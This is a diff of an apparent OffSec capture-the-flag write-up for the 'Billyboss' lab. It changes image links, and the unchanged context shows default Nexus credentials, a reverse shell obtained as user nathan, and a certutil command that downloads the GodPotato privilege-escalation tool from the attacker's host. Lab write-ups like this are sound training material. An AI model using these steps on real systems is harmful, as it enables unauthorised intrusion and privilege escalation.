@@ -114,14 +114,14 @@ ftp>
 # HTTP
 ## 80
 
-![](Pasted%20image%2020260514061024.png)
+![[Pasted image 20260514061024.png]]
 
-![](Pasted%20image%2020260514061127.png)
+![[Pasted image 20260514061127.png]]
 
 
-![](Pasted%20image%2020260514061157.png)
+![[Pasted image 20260514061157.png]]
 
-![](Pasted%20image%2020260514061419.png)
+![[Pasted image 20260514061419.png]]
 
 `http://192.168.147.61/v3/index.json`
 
@@ -182,12 +182,12 @@ ftp>
 
 ## 8081
 
-![](Pasted%20image%2020260515035846.png)
+![[Pasted image 20260515035846.png]]
 Sonatype Nexus Repository Manager OSS 3.21.0-05
 
-![](Pasted%20image%2020260515040148.png)
+![[Pasted image 20260515040148.png]]
 nexus / nexus
-![](Pasted%20image%2020260515042202.png)
+![[Pasted image 20260515042202.png]]
 
 ```zsh
 ┌──(kali㉿kali)-[~/CTF/OffSec/Billyboss]
@@ -215,7 +215,7 @@ Papers: No Results
 
 test
 
-![](Pasted%20image%2020260515042703.png)
+![[Pasted image 20260515042703.png]]
 
 ```zsh
 ┌──(kali㉿kali)-[~/CTF/OffSec/Billyboss]
@@ -231,9 +231,9 @@ Command executed
 
 https://www.revshells.com
 
-![](Pasted%20image%2020260515045113.png)
+![[Pasted image 20260515045113.png]]
 
-![](Pasted%20image%2020260515045035.png)
+![[Pasted image 20260515045035.png]]
 
 ```zsh
 ┌──(kali㉿kali)-[~/CTF/OffSec/Billyboss]
@@ -244,7 +244,7 @@ whoami
 billyboss\nathan
 PS C:\Users\nathan\Nexus\nexus-3.21.0-05> 
 ```
-![](Pasted%20image%2020260515045608.png)
+![[Pasted image 20260515045608.png]]
 
 
 ---
@@ -266,9 +266,9 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 Keyboard interrupt received, exiting.
 ```
 
-![](Pasted%20image%2020260515052244.png)
+![[Pasted image 20260515052244.png]]
 
-![](Pasted%20image%2020260515052142.png)
+![[Pasted image 20260515052142.png]]
 
 ```zsh
 PS C:\Users\nathan\Documents> certutil -urlcache -f http://192.168.45.180/GodPotato-NET4.exe GodPotato-NET4.exe
